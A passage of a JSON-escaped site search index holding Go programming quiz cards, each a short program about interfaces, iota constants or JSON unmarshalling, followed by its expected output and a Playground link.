style=\"color:#e6db74\"\u003e\u0026#34;hi\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epeo\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePeople\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ethink\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;love\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003epeo\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSpeak\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ethink\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/7SFsQFsd2YJ\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003ecompilation error\ncannot use Student{} (value of type Student) as People value in variable declaration: Student does not implement People (method Speak has pointer receiver)\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003einterface2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT1\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eT1\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;T1.Error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT2\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eT2\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;T2.String\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003et1\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003eT1\u003c/span\u003e{\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e { \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;T1.String\u0026#34;\u003c/span\u003e }}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003et2\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003eT2\u003c/span\u003e{\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e { \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;T2.Error\u0026#34;\u003c/span\u003e }}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et1\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e(), \u003cspan style=\"color:#a6e22e\"\u003et1\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et2\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e(), \u003cspan style=\"color:#a6e22e\"\u003et2\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et1\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003et2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/IzeaCg4N47K\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003eT1.Error T1.String\nT2.Error T2.String\nT1.Error T2.String\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003einterface3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{} = [\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e99\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/k5eQBOljQLH\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003etrue\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Interface"},{"categories":null,"contents":" iota package main import \u0026#34;fmt\u0026#34; const ( x = iota _ y z = \u0026#34;zz\u0026#34; k p = iota ) func main() { fmt.Println(x, y, z, k, p) } Answer Try it 0 2 zz zz 5 iota1 package main import \u0026#34;fmt\u0026#34; const ( a = iota b = iota ) const ( name = \u0026#34;name\u0026#34; c = iota d = iota ) func main() { fmt.Println(a, b, c, d) } Answer Try it 0 1 1 2 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/iota/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eiota\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ez\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;zz\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ez\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/ujsBSQPBkm8\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0 2 zz zz 5\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eiota1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e    = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ed\u003c/span\u003e    = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ed\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/9OvlzxqBZa5\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0 1 1 2\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Iota"},{"categories":null,"contents":" json package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; ) type AutoGenerated struct { Age int `json:\u0026#34;age\u0026#34;` Name string `json:\u0026#34;name\u0026#34;` Child []int `json:\u0026#34;child\u0026#34;` } func main() { jsonStr1 := `{\u0026#34;age\u0026#34;: 14,\u0026#34;name\u0026#34;: \u0026#34;potter\u0026#34;, \u0026#34;child\u0026#34;:[1,2,3]}` a := AutoGenerated{} json.Unmarshal([]byte(jsonStr1), \u0026amp;a) aa := a.Child fmt.Println(aa) jsonStr2 := `{\u0026#34;age\u0026#34;: 12,\u0026#34;name\u0026#34;: \u0026#34;potter\u0026#34;, \u0026#34;child\u0026#34;:[3,4,5,7,8,9]}` json.Unmarshal([]byte(jsonStr2), \u0026amp;a) fmt.Println(aa) } A. [1 2 3] [1 2 3] B. [1 2 3] [3 4 5] C. [1 2 3] [3 4 5 6 7 8 9] D. [1 2 3] [3 4 5 0 0 0] Answer Try it B json1 package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { t := struct { time.Time N int }{ time.Date(2020, 12, 20, 0, 0, 0, 0, time.UTC), 5, } m, _ := json.Marshal(t) fmt.Printf(\u0026#34;%s\u0026#34;, m) } A. {\u0026ldquo;Time\u0026rdquo;:\u0026ldquo;2020-12-20T00:00:00Z\u0026rdquo;,\u0026ldquo;N\u0026rdquo;:5} B. \u0026ldquo;2020-12-20T00:00:00Z\u0026rdquo; C. {\u0026ldquo;N\u0026rdquo;:5} D. \u0026lt;nil\u0026gt; E. 其他 Answer Try it B ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/json/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ejson\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;encoding/json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eAutoGenerated\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eAge\u003c/span\u003e   \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e    \u003cspan style=\"color:#e6db74\"\u003e`json:\u0026#34;age\u0026#34;`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e`json:\u0026#34;name\u0026#34;`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eChild\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e  \u003cspan 